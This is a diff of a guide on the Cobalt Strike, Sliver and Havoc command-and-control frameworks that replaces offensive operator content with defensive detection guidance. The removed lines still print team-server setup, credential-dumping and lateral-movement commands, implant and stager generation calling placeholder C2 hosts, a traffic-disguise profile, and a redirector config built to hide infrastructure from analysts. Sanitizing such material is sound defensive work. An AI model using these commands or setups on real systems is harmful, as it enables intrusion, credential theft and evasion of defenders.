@@ -1,7 +1,7 @@
 # C2 Frameworks - Deep Dive
 
 
-> **Scope:** Cobalt Strike, Sliver, and Havoc - architecture, deployment, OpSec considerations, detection signatures, and defensive countermeasures.
+> **Scope:** Cobalt Strike, Sliver, and Havoc - defensive architecture review, detection engineering, and network/endpoint controls. This guide does not include deployment, implant generation, listener setup, or command execution.
 
 ✅ **Quick-reference checklist:** [Command and Control](../Checklists/command-and-control.md)
 
@@ -21,16 +21,16 @@
 ---
 
 ## 🎯 Purpose
-Deep-dive on the three C2 frameworks a red team is most likely to encounter or deploy (Cobalt Strike, Sliver, Havoc) - architecture, OpSec, and detection in one place, rather than scattered across each tool's own docs.
+Defensive reference for recognizing common C2 architecture patterns and improving network and endpoint monitoring for Cobalt Strike, Sliver, and Havoc.
 
 ## ⚙️ Function
-Covers C2 architecture fundamentals, then a dedicated section per framework (Cobalt Strike, Sliver, Havoc), followed by cross-framework Malleable C2/traffic-shaping, infrastructure OpSec, detection/hunting, and defensive countermeasures. Pairs with the quick-reference [Command & Control checklist](../Checklists/command-and-control.md) for field use, and differs from [av-edr-evasion.md](av-edr-evasion.md), which covers evading endpoint detection rather than C2 channel/infrastructure design.
+Covers C2 architecture, framework-specific behavioral artifacts, traffic analysis, infrastructure logging, and defensive countermeasures. Pair it with the defensive [Command & Control checklist](../Checklists/command-and-control.md) and [AV/EDR detection guide](av-edr-evasion.md).
 
 ## 🏆 Goal
-An operator can stand up and OpSec-harden a C2 infrastructure for any of the three frameworks, and a defender can recognize and hunt for their traffic/behavioral signatures.
+A defender can map C2 components, correlate network and endpoint evidence, and identify controls that limit and detect unauthorized command channels.
 
 ## 📋 When to Use
-When selecting or configuring a C2 framework for an engagement, or when building detections/hunts for C2 traffic on the defensive side.
+When reviewing C2 alerts, assessing egress controls, or building detections and hunts.
 
 ## C2 Architecture Fundamentals
 
@@ -63,433 +63,48 @@ A Command and Control (C2) framework provides operators with a persistent channe
 
 ## Cobalt Strike
 
-### Overview
-
-Cobalt Strike (CS) is a commercial adversary simulation platform. Its Beacon payload is one of the most widely analyzed implants in existence - OpSec requires heavy customization.
-
-### Team Server Setup
-
-```bash
-# Start team server (Linux)
-./teamserver <external_IP> <password> [malleable_profile.c2]
-
-# Recommended: run behind a redirector, never expose team server directly
-# Use a systemd service for persistence
-sudo nano /etc/systemd/system/cobaltstrike.service
-```
-
-```ini
-[Unit]
-Description=Cobalt Strike Team Server
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/opt/cobaltstrike/teamserver 0.0.0.0 SuperSecretPass /opt/profiles/custom.c2
-WorkingDirectory=/opt/cobaltstrike
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-```
-
-### Beacon Types
-
-| Beacon | Protocol | Use Case |
-|---|---|---|
-| HTTP/HTTPS Beacon | HTTP/S | General purpose |
-| DNS Beacon | DNS A/TXT/MX | Egress-restricted networks |
-| SMB Beacon | Named pipes | Lateral movement (no internet required) |
-| TCP Beacon | Raw TCP | Internal pivoting |
-| External C2 | Custom channel | Slack, Twitter, OneDrive exfil channels |
-
-### Key Beacon Commands
-
-```bash
-# Execution
-shell <cmd>               # Spawn cmd.exe, execute command
-run <cmd>                 # Execute without shell
-execute-assembly <asm>    # Run .NET assembly in memory
-powershell <cmd>          # Run PowerShell
-powerpick <cmd>           # Unmanaged PowerShell (no powershell.exe)
-
-# Lateral Movement
-jump psexec <target> <share> <listener>
-jump winrm <target> <listener>
-jump psexec_psh <target> <listener>
-
-# Credential Harvesting
-hashdump                  # Dump SAM hashes (requires SYSTEM)
-logonpasswords            # Mimikatz sekurlsa::logonpasswords
-dcsync <domain> <user>    # DCSync attack via drsuapi
-
-# Post-Exploitation
-getsystem                 # Attempt privilege escalation
-steal_token <PID>         # Impersonate process token
-make_token <user> <pass>  # Create token from credentials
-rev2self                  # Revert to original token
-
-# Pivoting
-socks 1080                # Start SOCKS4a proxy
-rportfwd <lport> <rhost> <rport>  # Reverse port forward
-```
-
-### Artifact Kit & Payload Customization
-
-Default CS artifacts are heavily signatured. Use Artifact Kit to customize:
-
-- Replace default loader stubs with custom shellcode runners
-- Modify PE headers, section names, import tables
-- Change default sleep mask to obfuscate heap memory
-- Use BOFs (Beacon Object Files) for in-process execution without fork-and-run
-
-### OPSEC Considerations
-
-```
-❌ Avoid:
-  - Default 60s sleep with 0% jitter
-  - Default HTTP headers in Beacon traffic
-  - Spawning cmd.exe / powershell.exe for every command
-  - Using default artifacts (will be flagged by any AV)
-  - Exposing team server port (50050) to internet
-
-✅ Do:
-  - Use malleable C2 profiles mimicking legitimate services
-  - Set sleep 300 60 (5 min sleep, 60% jitter minimum)
-  - Enable spawnto customization (avoid WerFault.exe, etc.)
-  - Use SMB beacons for post-exploitation lateral movement
-  - Rotate infrastructure regularly
-```
-
----
+Cobalt Strike is a commercial adversary-simulation platform whose Beacon behavior is widely represented in threat research. For defense, focus on process lineage, memory-resident code, periodic network activity, protocol metadata, and unexpected outbound connections. This guide intentionally omits team-server setup and Beacon commands.
 
 ## Sliver
 
-### Overview
+Sliver is an open-source adversary-simulation framework. Its transports and implant artifacts vary by version and configuration. Treat encrypted transport as observable network activity, not as proof of benignness or invisibility.
 
-Sliver is an open-source C2 framework from BishopFox. Written in Go - implants compile to native binaries with no external dependencies. Actively developed and increasingly used in real-world operations.
-
-### Installation
-
-```bash
-# Server install (Linux)
-# Use the official project release/install documentation:
-# https://github.com/BishopFox/sliver
-# Select a specific release, inspect installation steps, and verify published
-# checksums/signatures before installing. Do not pipe a moving URL to sudo bash.
-
-# Start Sliver server and client only inside an isolated, authorized lab.
-sliver-server
-sliver-client
-```
-
-### Implant Generation
-
-```bash
-# HTTPS implant (encrypted transport does not make C2 traffic undetectable)
-generate --http https://your.redirector.com --os windows --arch amd64 --save /tmp/implant.exe
-
-# mTLS uses mutual authentication; its traffic can still be monitored and detected
-generate --mtls your.c2server.com:8888 --os windows --arch amd64
-
-# DNS implant
-generate --dns c2.yourdomain.com --os linux --arch amd64
-
-# Shellcode output (for injection)
-generate --http https://c2.example.com --format shellcode --save /tmp/payload.bin
-
-# Stager (small loader, fetches full implant)
-generate stager --lhost 192.168.1.100 --lport 443 --protocol https
-```
-
-### Listeners
-
-```bash
-# Start HTTPS listener
-https --lhost 0.0.0.0 --lport 443
-
-# Start mTLS listener
-mtls --lhost 0.0.0.0 --lport 8888
-
-# DNS listener
-dns --domains c2.yourdomain.com
-
-# WireGuard tunnel listener
-wg --lhost 0.0.0.0 --lport 51820
-```
-
-### Session Interaction
-
-```bash
-# List active sessions
-sessions
-
-# Interact with session
-use <session_id>
-
-# Core commands
-execute -o whoami
-shell                        # Interactive shell
-upload /local/file /remote/path
-download /remote/file /local/path
-ps                           # Process list
-getpid
-getuid
-getsystem                    # Attempt privilege escalation
-impersonate <username>       # Token impersonation
-make-token -u <user> -p <pass> -d <domain>
-
-# Lateral movement
-psexec --hostname <target> --service <name> --exe <implant>
-
-# Post-exploitation
-hashdump
-dcsync --domain corp.local --user Administrator
-execute-assembly <dotnet.exe> [args]
-sideload <shared_lib.dll> <entrypoint>   # Reflective DLL injection
-```
-
-### Armory (Extension Packages)
-
-```bash
-# Install community extensions
-armory install all
-
-# Notable extensions
-armory install rubeus        # Kerberos attacks
-armory install seatbelt      # Host enumeration
-armory install sharpup       # Privilege escalation checks
-armory install bofnet        # BOF support
-```
-
-### OPSEC Features
-
-- **Traffic profiles:** Sliver supports custom HTTP C2 profiles (similar to CS malleable)
-- **mTLS:** Mutual TLS provides strong authentication; certificate pinning prevents MITM inspection
-- **Canary domains:** Built-in canary detection to alert if implant is being analyzed
-- **Evasion:** Supports LLVM obfuscation via garble, custom compile flags
-
----
+**Defensive review:** correlate DNS/TLS/HTTP metadata, destination reputation and first-seen time with process ancestry, signer, executable memory, and user activity. Pin threat-intelligence claims to specific versions and samples.
 
 ## Havoc
 
-### Overview
-
-Havoc is an open-source, modern C2 framework with a Qt-based GUI. Written in C/C++ and Go. Demon implant supports indirect syscalls, sleep obfuscation, and token manipulation natively.
-
-### Installation
-
-```bash
-# Install dependencies
-sudo apt install -y git build-essential cmake libssl-dev pkg-config \
-  libboost-all-dev mingw-w64 nasm python3-dev qtbase5-dev qtchooser
-
-# Clone and build
-git clone https://github.com/HavocFramework/Havoc.git
-cd Havoc
-make ts-build    # Build team server
-make client-build  # Build client GUI
-```
-
-### Teamserver Configuration
-
-```yaml
-# profiles/havoc.yaotl
-Teamserver {
-    Host = "0.0.0.0"
-    Port = 40056
-
-    Build {
-        Compiler64 = "x86_64-w64-mingw32-gcc"
-        Nasm = "/usr/bin/nasm"
-    }
-}
-
-Operators {
-    user "operator1" {
-        Password = "S3cur3P@ss"
-    }
-}
-
-Listeners {
-    Http {
-        Name         = "https-listener"
-        Hosts        = ["your.redirector.com"]
-        Port         = 443
-        Secure       = true
-        Cert         = "/path/to/cert.pem"
-        Key          = "/path/to/key.pem"
-        Response {
-            Headers = [
-                "Content-type: text/html",
-                "Server: Apache"
-            ]
-        }
-    }
-}
-```
-
-### Demon Implant Features
-
-The Demon agent has several built-in evasion capabilities:
-
-| Feature | Description |
-|---|---|
-| Indirect Syscalls | Avoids hooked `ntdll.dll` functions via custom syscall stubs |
-| Sleep Obfuscation | Encrypts implant in memory during sleep (Ekko/Foliage technique) |
-| Stack Duplication | Spoofs call stack during sleep to evade memory scanning |
-| Token Vault | Stores and manages impersonation tokens |
-| PE Stomping | Overwrites implant PE headers to defeat signature scans |
-
-### Key Commands
-
-```bash
-# Process injection
-inject <PID> <arch> <shellcode_file>
-shinject <PID> <arch> <shellcode_file>   # Shellcode injection
-
-# Token operations
-token steal <PID>
-token make <domain\user> <password>
-token list
-token revert
-
-# Kerberos
-kerberos ticket import <ticket.kirbi>
-kerberos ticket list
-
-# Pivoting
-socks5 add --port 1080
-portfwd add --fport 8080 --thost 192.168.1.10 --tport 80
-
-# .NET execution
-dotnet inline-execute <assembly.exe> [args]
-dotnet list-assemblies
-```
-
----
+Havoc is an open-source framework with a team server, listeners, and endpoint components. For defense, identify unexpected listener exposure, unapproved services, process injection behaviors, and unusual certificate or domain combinations. Do not expose management interfaces to public networks.
 
 ## Malleable C2 & Traffic Shaping
 
-Malleable C2 (Cobalt Strike) and equivalent profile systems allow operators to mimic legitimate application traffic.
+Traffic may be configured to resemble common protocols, but traffic appearance alone is not a reliable detection or evasion verdict. Defenders should compare flow timing, byte counts, TLS certificate/SNI/JA3-like metadata where available, DNS history, destination age, and endpoint process activity against a host's baseline.
 
-### Profile Structure (CS)
-
-```c
-# Example: Mimic Microsoft Update traffic
-set sleeptime "45000";
-set jitter    "30";
-set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
-
-http-get {
-    set uri "/updates/download/windowsupdate";
-    
-    client {
-        header "Accept" "application/octet-stream";
-        header "Accept-Encoding" "identity";
-        header "Connection" "close";
-        metadata {
-            base64url;
-            prepend "sessionToken=";
-            header "Cookie";
-        }
-    }
-    
-    server {
-        header "Content-Type" "application/octet-stream";
-        header "Cache-Control" "no-cache";
-        output {
-            base64url;
-            prepend "MZ";
-            print;
-        }
-    }
-}
-```
-
-### Profile Verification
-
-```bash
-# Validate CS profile before use
-./c2lint custom_profile.c2
-```
-
-### Sliver HTTP C2 Profiles
-
-```yaml
-# .sliver/configs/http-c2.yaml
-implant_config:
-  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-  chrome_extensions: []
-  
-server_headers:
-  - "Server: Apache/2.4.51"
-  - "X-Powered-By: PHP/7.4.3"
-
-paths:
-  - /assets/bootstrap.min.js
-  - /cdn-cgi/challenge-platform/h/b/orchestrate/managed_widgets
-  - /wp-includes/js/jquery/jquery.min.js
-```
-
----
+| Signal | Defensive use | Limitation |
+|---|---|---|
+| Repeated timing or low-variance beaconing | Prioritize a host for correlation | Legitimate agents can also be periodic |
+| Rare or newly seen domains | Enrich with DNS and registration context | New domains can be legitimate |
+| Unusual TLS or HTTP metadata | Compare against software inventory and known baselines | Metadata can be incomplete or shared |
+| Process-to-network mismatch | Investigate a process with unexpected egress | Parent/child relationships vary by application |
 
 ## Infrastructure OpSec
 
-### Redirector Setup
+For a defender, infrastructure analysis means mapping and restricting outbound paths:
 
-Redirectors hide your team server from direct exposure. Never point beacons directly at the team server.
+- Log DNS queries and outbound flows at managed resolvers and gateways.
+- Require proxy or egress gateway use where feasible; restrict direct outbound access by workload.
+- Inventory approved remote administration and monitoring services to reduce false positives.
+- Alert on new listeners, reverse proxies, port-forwarding services, and unexpected public management interfaces.
+- Preserve DNS, TLS, firewall, and endpoint evidence before blocking an indicator.
 
+```mermaid
+flowchart LR
+    A[Endpoint process] --> B[Outbound DNS or TLS]
+    B --> C[Managed resolver and egress logs]
+    A --> D[EDR process and memory events]
+    C --> E[Correlate host time destination and process]
+    D --> E
+    E --> F[Contain under incident response plan]
 ```
-Internet ──► [CDN/Domain Fronting] ──► [Redirector VPS] ──► [Team Server]
-```
-
-**Nginx redirector config:**
-
-```nginx
-server {
-    listen 443 ssl;
-    server_name your.redirector.com;
-
-    ssl_certificate /etc/letsencrypt/live/your.redirector.com/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/your.redirector.com/privkey.pem;
-
-    # Only forward known beacon URIs, block everything else
-    location /updates/download/ {
-        proxy_pass https://TEAM_SERVER_IP:443;
-        proxy_ssl_verify off;
-        proxy_set_header Host $host;
-        proxy_set_header X-Forwarded-For $remote_addr;
-    }
-
-    # Block everything else (analyst crawlers, scanners)
-    location / {
-        return 302 https://microsoft.com$request_uri;
-    }
-}
-```
-
-### Domain Selection
-
-- **Categorized domains:** Purchase aged domains already categorized as Finance, IT, News
-- **Certificate:** Always use a valid TLS cert (Let's Encrypt) - avoid self-signed
-- **Domain fronting:** Route traffic through CDNs (Cloudflare, AWS CloudFront) when possible
-- **TTL:** Set short DNS TTL early, then lengthen - allows fast pivoting if burned
-
-### Infrastructure Separation
-
-```
-Campaign A infrastructure ──► different VPS provider, different domain registrar
-Campaign B infrastructure ──► different VPS provider, different domain registrar
-
-Never reuse:
-  - IP addresses across campaigns
-  - SSL certificates
-  - Domain registrar accounts
-  - Payment methods
-```
-
----
 
 ## Detection & Hunting
 
